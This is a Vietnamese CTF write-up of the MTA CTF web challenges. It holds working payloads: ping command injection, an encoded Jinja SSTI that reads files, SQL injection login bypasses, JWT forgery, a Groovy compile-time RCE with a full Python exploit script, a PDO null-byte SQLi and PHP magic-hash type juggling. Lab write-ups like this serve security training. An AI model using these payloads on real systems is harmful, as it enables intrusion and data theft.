---
title: WEB MTA CTF

---

# WRITEUP MTA CTF 

# WEB
## Well-done
![image](https://hackmd.io/_uploads/H12h_2kLWx.png)

![image](https://hackmd.io/_uploads/HyMauh1I-g.png)
- Như ta thấy chall đã gợi ý là dùng ping tool
- Ta sẽ thử ping `127.0.0.1; ls` để xem phía server có phản hồi không
- ![image](https://hackmd.io/_uploads/B1HIYny8Ze.png)
- Từ đây ta thấy được 1 file tên là `flag.txt` ở root `/`
=> Dùng `cat /flag.txt` để đọc file
![image](https://hackmd.io/_uploads/SJgCYn1IWe.png)

**FLAG: MSEC{So_3asY_4_F1RsT_Ch4ll}**

## Hello World
![image](https://hackmd.io/_uploads/Bypmc31Ibl.png)

![image](https://hackmd.io/_uploads/BJQEq2kIWe.png)

- Nhập thử vào ô `Your name` rồi xem phản hồi của web
![image](https://hackmd.io/_uploads/HyKgbaJIZx.png)
- Khi nhập thử `abc` thì trả về như trong ảnh
- Bây giờ ta sẽ thử payload SSTI cơ bản để thám thính (`{{7*7}}`)
- ![image](https://hackmd.io/_uploads/BJg4Z6JLWx.png)
=> Trả về `49` => SSTI

- Khi nhập payload để liệt kê các file thì trả về `Hacking detected! 🚨` => Web đã chặn payload khai thác flag
- Ta sẽ thử decode payload `{% print lipsum|attr('\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f')|attr('\x67\x65\x74')('\x6f\x73')|attr('\x70\x6f\x70\x65\x6e')('\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x2e\x74\x78\x74')|attr('\x72\x65\x61\x64')() %}`
- ![image](https://hackmd.io/_uploads/rklmjZpyLWg.png)
- Đã trả về được flag => done

**Flag: MSEC{W3ll-C3m00000-BaBy}**

## Chicken Guy
![image](https://hackmd.io/_uploads/SJHJGTyUbx.png)
![image](https://hackmd.io/_uploads/SyFyGa1LWl.png)

- Theo như mô tả của chall thì ta có thể nghĩ ngay là SQLi
- Để kiểm chứng ta sẽ thử nhập username là `admin'--` và password bất kỳ để thám thính
- ![image](https://hackmd.io/_uploads/r1_8z61LZg.png)

- Thật bất ngờ là trả về được flag => suy nghĩ của ta đã đúng
- Lỗi SQLi dạng authentication bypass, khi nhập `admin'--` thì password ở đằng sau đã bị comment lại => Database chỉ thực thi đoạn `WHERE username = 'admin'`, điều kiện này luôn `TRUE` nếu user admin tồn tại

**Flag: MSEC{SQL_So_3aSy_4_YYYY}**

## CVE-2025-*****
![image](https://hackmd.io/_uploads/SJXhHTyUWx.png)
![image](https://hackmd.io/_uploads/SkP5ETkL-l.png)
![image](https://hackmd.io/_uploads/r1ziV61IWe.png)

### Phân tích
#### Kiến trúc
- Next.js (app router)
- Authentication: sử dụng JSON Web Token (JWT) 
#### Middleware
![image](https://hackmd.io/_uploads/S1NbBa1UWl.png)
- File `middleware.js` là proxy cho các request vào `/dashboard`
    - Kiểm tra cookie có tên là auth
    - Nếu cookie không tồn tại hoặc giá trị không phải là `authenticated` thì user sẽ bị redirect về trang chủ `/`
    - Ta thấy nó chỉ check giá trị string của cookie mà không verify signature hay tính hợp lệ của session phía server

#### Target endpoint
- File `app/api/flag/route.js` là nơi chứa flag ![image](https://hackmd.io/_uploads/SJMlUpJI-e.png)

    - Request phải có header `Authorization: Bearer <token>`
    - Token được verify bằng `process.env.SECRET_KEY`
    - Sau khi decode, payload của token phải có`role` là `admin`
    
### Vuln
- Tại file `app/dashboard/page.js` có để lại một comment gợi ý ![image](https://hackmd.io/_uploads/BJsLIT18-g.png) về một endpoint ẩn `Hint: /api/s*****` 
- Middleware tin tưởng tuyệt đối vào input từ phía client (Cookie: `auth=authenticated`) => Ta có thể tự tạo cookie này để vượt qua lớp bảo vệ mà không cần login
- Ta truy cập được vào endpoint ẩn làm lộ `SECRET_KEY` thực sự của server 
- Khi đã có `SECRET_KEY` ta có thể tự tạo bất kỳ token nào với quyền admin

### Exploit
#### Recon & tìm endpoint ẩn
- Dựa vào gợi ý trong `dashboard/page.js` là `/api/s*****`, ta đoán endpoint có thể là `/api/secret`, `/api/source`, hoặc `/api/status`. Khi truy cập thử `/api/secret` trên browser, server trả về `307` Redirect về trang chủ => chứng tỏ endpoint này TỒN TẠI nhưng đang bị chặn bởi Middleware
(Ta có thể dùng fuzz để quét endpoint)

#### Bypass middleware
- Để truy cập `api/secret`. ta cần lừa middleware bằng cách inject cookie
- Gửi request tới  `api/secret` với cookie `Cookie: auth=authenticated`![image](https://hackmd.io/_uploads/H1j-_pk8Zg.png)
- Server trả về JSON chứa Secket thật: `"secret_key":"Anh-tung-dep-trai-vc"` 🤡🤡🤡


#### Tạo admin token giả 
- Sử dụng secret key vừa lấy được để tạo JWT Token để bypass check lại `api/flag/route.js`
- Ta có thể dùng jwt.io để có thể tạo JWT token với:
    - Header: `{"alg": "HS256", "typ": "JWT"}`
    - Payload: `{"role": "admin"}` 
    - Signature: Ký bằng key `Anh-tung-dep-trai-vc`

- Script python tạo token: 
```python
import jwt
key = "Anh-tung-dep-trai-vc"
payload = {"role": "admin"}
token = jwt.encode(payload, key, algorithm="HS256")
print(token)
```

#### Lấy flag
- Gửi request cuối cùng tới endpoint `api/flag` trả về flag với token vừa tạo
``` json
{
  "success": true,
  "message": "Congratulations!",
  "flag": "MSEC{Bypass_proxy_so_izzzzz}"
}
```

**Flag: MSEC{Bypass_proxy_so_izzzzz}**

## JVE-2025-*****
![image](https://hackmd.io/_uploads/H1xA7A1L-g.png)
![image](https://hackmd.io/_uploads/ryvvSR1I-l.png)

### Phân tích
- Theo `Dockerfile` và `pom.xml`
    - File flag nằm tại `/flag.txt` được tạo với quyền user `oim` (UID 1000) và permission `400` (chỉ owner đọc được) ![image](https://hackmd.io/_uploads/rJoMHC1UZx.png)

    - Trong `pom.xml`, project sử dụng `groovy-all` v3.0.9 => đây là một thư viện script động, thường là vector tấn công nếu bị khai thác ko an toàn
- Cơ chế bảo mật `SecurityFilter.java`
    - Ứng dụng sử dụng 1 filter tự viết là `SecurityFilter`
    - Filter này chặn hầu hết các request không xác thực, ngoại trừ các endpoint công khai như `/login`, `/static`
    - Nếu user đăng nhạp (session `authenticated` là null hoặc false) request sẽ bị trả về lỗi 401
- Endpoint chức năng (`GroovyCompilationController.java`)
    - Controller này nằm ở `/iam/governance/applicationmanagement/api/v1/applications` 
    - Có endpoint `/groovyscriptstatus` nhận một đoạn script groovy từ JSON body và thực hiện biên dịch

### Vuln
#### Authentication bypass
- Tại file `SecurityFilter.java` logic kiểm tra quyền truy cập một blackdoor dàn cho mục đích debug hoặc legacy support![image](https://hackmd.io/_uploads/rkCJvCJ8-x.png)

- Đoạn code trên kiểm tra nếu URL có chứa query string là `WSDL` (không phân biệt hoa thường) filter sẽ cho phép request đi qua mà không kiểm tra session => Ta có thể truy cập bất kỳ API nào (kể cả admin) chỉ bằng cách thêm `?WSDL` vào cuối URL


#### RCE via groovy
- Tại `GroovyCompilationController.java`, endpoint `/groovyscriptstatus` xử lý input của user như sau: ![image](https://hackmd.io/_uploads/H1sjwA1UWg.png)

    - Hàm `loader.parseClass(groovyScript)` biên dịch chuỗi string thành Java Class
    - Mặc dù chỉ là biên dịch nhưng ngôn ngữ groovy có tính năng meta-programming mạnh, ta có thể sử dụng annotation `@ASTTest ` hoặc `@Grab` để explopit code ngay trong quá trình biên dịch mà không cần đợi class đó được khởi tạo hay gọi hàm
    - Kết hợp với việc ứng dụng trả về `Exception message` khi có lỗi, ta có thể leak được output của lệnh thực thi


### Exploit
#### Xác định
- Target là endpoint biên dịch Groovy, nhưng đi kèm với bypass auth
    - Url: `http://localhost:14000/iam/governance/applicationmanagement/api/v1/applications/groovyscriptstatus?WSDL`
    - Method: `POST`
    - Content-type: `application/json`
![image](https://hackmd.io/_uploads/B173OA1UWx.png)

#### Payload
- Ta sẽ sử dụng AST Transformation của Groovy để exploit lệnh hệ thống `cat /flag.txt`
- Vì server chỉ trả về `error` message khi có exception => ta sẽ throw một exception chứa kết quả của lệnh cat
**Payload Groovy:**
```java
@groovy.transform.ASTTest(value={
    // lệnh đọc flag
    def proc = "cat /flag.txt".execute()
    proc.waitFor()
    // Lấy kết quả trả về
    def output = proc.in.text
    // Ném lỗi chứa flag để server trả về trong JSON response
    assert false : "Flag: " + output
})
def x
```

#### Gửi request

```html\
curl -X POST "http://ctf.msec.cloud-ip.cc:14000/iam/governance/applicationmanagement/api/v1/applications/groovyscriptstatus?WSDL" \
     -H "Content-Type: application/json" \
     -d '{
           "groovyScript": "@groovy.transform.ASTTest(value={ assert false : \"RESULT:\" + \"cat /flag.txt\".execute().text }) class Pwn {}"
         }'
```

#### Lấy flag
- Server sẽ cố gắng biên dịch script. `@ASTTest` sẽ kích hoạt  `cat /flag.txt`. Sau đó `assert false` sẽ gây ra lỗi biên dịch, và nội dung lỗi (chứa flag) sẽ được `GroovyCompilationController` bắt lại và trả về trong field `error` hoặc `output`

### FULL SCRIPT:
```python
import requests
import json

# Target Configuration
BASE_URL = "http://localhost:14000"
# Endpoint vulnerable to RCE, protected by Auth
VULN_PATH = "/iam/governance/applicationmanagement/api/v1/applications/groovyscriptstatus"

# [!] Exploit Logic
# 1. Bypass Auth: Append ?WSDL
# 2. RCE: Use Groovy @ASTTest to execute command at compile time
# 3. Exfil: Throw result in an assertion error to see it in the response

target_url = f"{BASE_URL}{VULN_PATH}?WSDL"

print(f"[+] Target: {target_url}")

# Payload: Read /flag.txt which is set in Dockerfile
groovy_payload = """
@groovy.transform.ASTTest(value={
    def proc = "cat /flag.txt".execute()
    proc.waitFor()
    // Throw exception to leak output in the JSON response
    throw new RuntimeException("EXPLOIT_OUTPUT: " + proc.in.text)
})
class Pwn {}
"""

headers = {
    "Content-Type": "application/json"
}

data = {
    "groovyScript": groovy_payload
}

try:
    print("[*] Sending malicious Groovy payload...")
    response = requests.post(target_url, json=data, headers=headers)
    
    # Parse output
    if response.status_code == 200:
        json_resp = response.json()
        if "output" in json_resp and "EXPLOIT_OUTPUT" in json_resp["output"]:
            # Extract flag from stack trace or error message
            raw_output = json_resp["output"]
            import re
            flag = re.search(r"MSEC\{.*?\}", raw_output)
            if flag:
                print(f"\n[SUCCESS] FLAG FOUND: {flag.group(0)}")
            else:
                print("\n[!] Output found but no flag format:")
                print(raw_output)
        elif "error" in json_resp:
             print(f"\n[!] Error from server: {json_resp['error']}")
             # Check if flag is in error message
             if "MSEC{" in json_resp['error']:
                 print(f"[SUCCESS] FLAG FOUND in Error: {json_resp['error']}")
        else:
            print("\n[?] Unexpected response:")
            print(json_resp)
    else:
        print(f"[!] Request failed. Status: {response.status_code}")
        print(response.text)

except Exception as e:
    print(f"[!] Exploit failed: {e}")
```

**FLAG: MSEC{Y0U_ARE_A_RE_G0D_!!}**

## BlackD00r
![image](https://hackmd.io/_uploads/rJKOjug8Zl.png)
![image](https://hackmd.io/_uploads/SyGPiOxI-g.png)

### Phân tích
#### Cơ chế đăng nhập (`login.php`)
- Trong file `login.php` xử lý đăng nhập theo 2 nhánh:
    - User thường: sử dụng `password_verify` (brypt)
    - Admin: sử dụng `sha1($password) === $user['password']`![image](https://hackmd.io/_uploads/Sy1AidgI-g.png)
=> SHA-1 đã lỗi thời và rất dễ bị crack. Nếu ta có hash của admin thì ta có thể tìm ra password gốc

#### Backdoor: `bid_handler.php`
- Trong file `bid_handler.php` sử dụng extention `runkit` để tạo hàm `ruleCheck` động từ db ![image](https://hackmd.io/_uploads/S1vr2deUWe.png)
- Biến `$rule` được lấy trực tiếp từ bảng `auctions` trong db
=> Nếu ta kiểm soát được nội dung cột `rule` trong db, ta có thể chèn code PHP => RCE

#### Admin panel
- File `admin.php` cho phép admin chỉnh sửa `rule` và `message` của các phiên đấu giá => flag được hardcode trong file này ![image](https://hackmd.io/_uploads/B1HMbKxIWg.png)

### Vuln
- **Lỗ hổng SQL Injection** `inventory.php`: các tham số `user_id` và `sort` được truyền vào các truy vấn SQL mà không được xử lý đúng cách, cho phép thực thi các lệnh SQL tùy ý thông qua việc chèn dấu ngoặc kép ngược ![image](https://hackmd.io/_uploads/Sy7pQteL-g.png)

- **Quá trình xử lý trong admin panel**: dynamic rules system cho các cuộc đấu giá sử dụng `runkit_function_add()` để tạo động các hàm PHP từ dữ liệu đầu vào của user, mở ra kẽ hở cho RCE

**Chain: SQL Injection → trích xuất thông tin đăng nhập → truy cập admin panel → lấy flag**

### Exploit
####  SQL Injection để trích xuất thông tin đăng nhập
- `inventory.php` các tham số user được xử lý một cách đáng nghi. Sau khi phân tích chi tiết hơn ta thấy: các tham số `user_id` và `sort` được đưa trực tiếp vào các truy vấn SQL mà không qua bất kỳ bộ lọc nào => Đây là lỗi tấn công SQL injection kinh điển thông qua việc chèn dấu ngoặc kép ngược (backtick). Để khai thác lỗi này, ta sử dụng payload sau:
```
http: //localhost:8080/inventory.php?user_id=x`+FROM+(SELECT+group_concat(username,0x3a,password)+AS+`%27x`+FROM+users)y;--+-&sort=\?;--+-%00
```
- Key point để bypass PDO
    - `\?` : Dấu backslash trước dấu chấm hỏi làm hỏng quá trình phát hiện tham số vì PDO quét `?` các phần giữ chỗ trước khi phân tích cú pháp MySQL và không nhận ra biến thể được mã hóa
    -` %00` : bull byte gây ra hiện tượng cắt ngắn chuỗi ở cấp độ C trong trình điều khiển MySQL, dẫn đến việc cắt bỏ phần còn lại của truy vấn
    ![image](https://hackmd.io/_uploads/Bk-RrFlIbx.png)

#### Truy cập admin panel
- Như ta thấy ta đã trích xuất được thông tin của `admin` kèm pasword đã bị bcrypt (`b78034aacf3559fffbfcb545d9a9122efb93181f`)
- Ta tra passwod bcrypt trên thì trả về password là `iloveu`![image](https://hackmd.io/_uploads/H1dtUKgIZe.png)
(https://gist.github.com/roycewilliams/226886fd01572964e1431ac8afc999ce)

- Login vào `admin:iloveu`![image](https://hackmd.io/_uploads/Bkk68tgLbg.png)
=> Trả về được flag ở admin panel

**Flag: MSEC{PDO_So_danger}**

## RealHacker
- chall này khác đặc biệt
- Khi vào link chall ta thấy xuất hiện là 1 trang login bình thường
- Khi ta thử nhập username và password bất kỳ rồi nhấn sign up thì sẽ trả về`User not found`
- Ta sẽ thử nhập các username đặc biệt như `admin`, `administrator`,v...v.. và bất ngờ là khi nhập username=`admin` và password bất kỳ thì trả về error `Invalid credentials` => username=`admin` có tồn tại và ta phải đi tìm mật khẩu của nó
- Nhưng việc mò mật khẩu gần như vô vọng
    - Ở đây ta sẽ nghĩ đến việc nếu ta cho password là dạng `array` thì sẽ như thế nào
![image](https://hackmd.io/_uploads/BkQkEix8Wx.png)
- Thật bất ngờ là trả về md5 => server đang hash password đầu vào bằng MD5 rồi mới so sánh
- Trong php nếu một chuỗi bắt đầu bằng `0e` theo sau toàn bộ (ví dụ `0e123456`) PHP sẽ coi nó là ký hiệu khoa học của số 0 ($0 \times 10^{n}$) => `0e123...` == `0e456...` (do `0==0`)
- Ta nghĩ hash mật khẩu của admin trong db là một chuỗi bắt đầu bằng `0e` và toàn số.
- Bây giờ ta cần nhập một password sao cho `md5(password)` cũng ra kết quả `0e`
[PHP type juggling (magic hash)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md)
- Ta sẽ thử nhập `240610708` 
    - `md5("240610708") = 0e462097431906509019562988736854`
=> Thật bất ngờ!!! trả về flag part 1 => suy nghĩ của ta đã đúng
![image](https://hackmd.io/_uploads/rJyRHieI-e.png)

- Cũng với suy nghĩ đó ta sẽ thử tìm một username khác nếu trả về `Invalid Credentials` thì tức là username đó tồn tại trong db
- Ta thử nghĩ đến việc dùng SQLi như `admin'--` nhưng đều trả về `User not found` => từ đây có thể thấy mọi payload SQLi nhập vào không có tác dụng
- Tôi đã thử mò các username khác và phát hiện ra username=`guest` và password=`guest123` nhưng thật buồn vì nó chỉ là một dịch vụ ![image](https://hackmd.io/_uploads/B1ypUox8Zl.png)

- Bất lực khi cố mò username trả về `Invalid credentials`
- Tôi đã thử nghĩ liệu rằng là challenge này có port khác không, khi phần mô tả của challenge nói `Lắp rạp lại thành flag`
- Từ đây tôi đã thử dùng nmap để quét xem còn có port nào khác mà tôi không biết
`nmap -p- -T4 -v 160.191.49.168`

- THẬT BẬT NGỜ là tồn tại port khác mà tôi không biết, không những thế còn có tận 2 port dịch vụ khác là `534` và `768`

### port 534
![image](https://hackmd.io/_uploads/S1s7dsgLbe.png)

- Ta thấy được là ở port này ta có cái endpoint như `api/status` và `api/health`
- Ta đây ta lại có nghi ngờ rằng là liệu còn có endpoint nào khác không
- Để kiểm chứng tôi đã dùng fuzz để quét endpoint
- Và thực sự nghi ngờ của tôi đã đúng => tìm ra được endpoint `secrets` 
- Truy cập tới endpoint trên thì ta tìm ra được flag part 2 là:
`{"message":"Congratulations! You found the hidden endpoint.","flag_part2":"haking_is_"}`

### port 768
![image](https://hackmd.io/_uploads/r1e7FieIWl.png)

- Ở port này khi ta ấn thử vào các profile ở trang chính thì trên url trả về `/profile?id=1` (khi nhấn vào profile của John Smith)
=> Ta nghĩ ngay tới IDOR
- Ta sẽ thử các ID quen thuộc mang tính mặc định của hệ thống như `999`, `1337`

- Bất ngờ là id `1337` thật sự đã trả về profile của admin kèm flag ![image](https://hackmd.io/_uploads/BJlp5ieLbg.png)

- Ghép các phần flag lại ta được flag hoàn chỉnh là: `MSEC{Real_haking_is_this}`

**FLAG: MSEC{Real_haking_is_this}**